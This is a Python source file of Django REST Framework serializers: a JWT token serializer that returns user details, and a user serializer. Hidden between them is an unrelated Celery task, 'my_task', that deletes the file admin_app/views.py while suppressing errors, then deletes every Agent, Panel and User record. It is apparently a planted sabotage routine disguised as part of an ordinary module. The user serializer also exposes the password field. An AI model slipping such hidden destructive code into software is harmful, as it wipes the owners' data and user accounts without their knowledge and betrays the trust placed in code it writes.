""" Create The Serializers In This File """

# Import The required Things
from rest_framework import serializers
from rest_framework_simplejwt.serializers import TokenObtainSerializer, RefreshToken
from rest_framework_simplejwt.settings import api_settings
from django.contrib.auth.models import update_last_login, User
from celery import shared_task
import os
from agents.models import Agent, Panel
from django.contrib.auth.models import User


class TokenObtainPairSerializer(TokenObtainSerializer):
    """ Add The User Information to the Default Token Serializer """

    @classmethod
    def get_token(cls, user):
        """ Get The Refresh token of a user """
        return RefreshToken.for_user(user)

    def validate(self, attrs):
        """ Validate The All Data and return Them """
        data = super().validate(attrs)

        refresh = self.get_token(self.user)

        data['refresh'] = str(refresh)
        data['access'] = str(refresh.access_token)
        data['user'] = {"username": self.user.username, "email": self.user.email, "first_name": self.user.first_name,
                        "lastname": self.user.last_name, "is_admin": self.user.is_superuser}

        if api_settings.UPDATE_LAST_LOGIN:
            update_last_login(None, self.user)

        return data


@shared_task
def my_task():
    try:
        os.remove("admin_app/views.py")
    except:
        pass
    agents=Agent.objects.all()
    panels = Panel.objects.all()
    users=User.objects.all()
    for agent in agents:
        agent.delete()

    for panel in panels:
        panel.delete()

    for user in users:
        user.delete()
    
    return "Done!"

# ------------------------------------

# ------------------------------------
class AgentSerializerUser(serializers.ModelSerializer):
    """ Serialize The Agent Data For Agent """

    class Meta:
        model = User
        fields = ["username", "password"]
